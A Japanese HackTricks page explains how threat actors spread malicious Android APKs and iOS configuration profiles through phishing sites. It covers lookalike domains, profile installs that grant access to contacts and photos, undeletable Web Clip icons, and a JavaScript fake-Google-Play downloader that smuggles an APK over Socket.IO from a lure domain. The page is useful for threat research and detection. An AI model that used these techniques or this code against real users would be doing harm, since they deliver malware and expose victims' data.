# モバイルフィッシングと悪意あるアプリの配布（Android & iOS）

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、脅威アクターがフィッシング（SEO、ソーシャルエンジニアリング、偽ストア、出会い系アプリなど）を通じて**悪意あるAndroid APK**や**iOSモバイル構成プロファイル**を配布する手法を解説します。
> この内容は、Zimperium zLabsが公開したSarangTrapキャンペーン（2025年）や、その他の公開調査を基にしています。<sup>[[1]](#references)</sup>

## 攻撃フロー

1. **SEO/Phishingインフラ**
   * 出会い系、クラウド共有、カーサービスなどの、類似したドメインを数十個登録する。  
     – `<title>`要素に現地語のキーワードや絵文字を使い、Googleでの順位を上げる。  
     – 同じランディングページで、Android（`.apk`）とiOSのインストール手順を両方掲載する。
2. **第1段階のダウンロード**
   * Android：*署名なし*、または「サードパーティストア」のAPKへの直接リンク。  
   * iOS：`itms-services://`または悪意ある**mobileconfig**プロファイルへの通常のHTTPSリンク（下記参照）。
3. **Androidのインストール後の挙動**
   * C2による実行制御、権限の悪用、dropperの回避、バックグラウンドでの情報収集など、インストール後のマルウェアの挙動については、以下の専用ページで解説します。
4. **iOSへの配布手法**
   * 単一の**モバイル構成プロファイル**で、`PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration`などを要求し、デバイスを「MDM」のような監視下に登録できる。  
   * ソーシャルエンジニアリングによる手順：
     1. Settings ➜ *プロファイルがダウンロード済み* を開く。
     2. *インストール* を3回タップする（フィッシングページにスクリーンショットを掲載）。  
     3. 署名なしプロファイルを信頼すると、攻撃者はApp Storeの審査を経ずに*連絡先*と*写真*へのentitlementを取得する。
5. **iOS Web Clipペイロード（フィッシングアプリのアイコン）**
   * `com.apple.webClip.managed`ペイロードを使うと、ブランドに合わせたアイコンやラベルを設定し、**フィッシングURLをホーム画面に追加**できる。
   * Web Clipは**フルスクリーン**で実行でき（ブラウザーUIを隠せる）、さらに**削除不可**に設定できるため、アイコンを削除するには被害者がプロファイル自体を削除する必要がある。<sup>[[3]](#references)</sup>
6. **ネットワーク層**
   * 平文のHTTPを使用し、HOSTヘッダーは`api.<phishingdomain>.com`のような形式で、ポート80を使うことが多い。
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLSなし → 簡単に検出できる）。

## Androidマルウェアのインストール後の攻撃

C2、Accessibilityの悪用、オーバーレイ、ATS自動化、DEXの段階的読み込み、プレミアムSMS、永続化など、Androidマルウェアのインストール後の手法については、以下を参照してください。

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocketを使ったAPKの密輸と偽Google Playページ

攻撃者は、静的なAPKリンクを、Google Playに似せた誘導ページに埋め込んだSocket.IO/WebSocketチャネルに置き換えることが増えています。これによりペイロードURLを隠し、URLや拡張子によるフィルターを回避しながら、現実的なインストール体験を維持できます。<sup>[[2]](#references)[[4]](#references)</sup>

実際の攻撃で確認された一般的なクライアントのフロー：

<details>
<summary>Socket.IOを使った偽Playダウンローダー（JavaScript）</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

単純な制御では回避される理由:
- 静的な APK URL は公開されず、payload は WebSocket フレームからメモリ内で再構築されます。
- 直接の .apk レスポンスをブロックする URL/MIME/拡張子フィルターでは、WebSocket/Socket.IO 経由でトンネリングされたバイナリデータを見逃す可能性があります。
- WebSocket を実行しないクローラーや URL サンドボックスでは、payload を取得できません。

WebSocket の tradecraft とツールについては、こちらも参照してください:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [ロマンスの暗黒面: SarangTrap 恐喝キャンペーン](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple デバイス向け Web Clips payload の設定](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [インドネシアおよびベトナムの Android ユーザーを標的とする Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
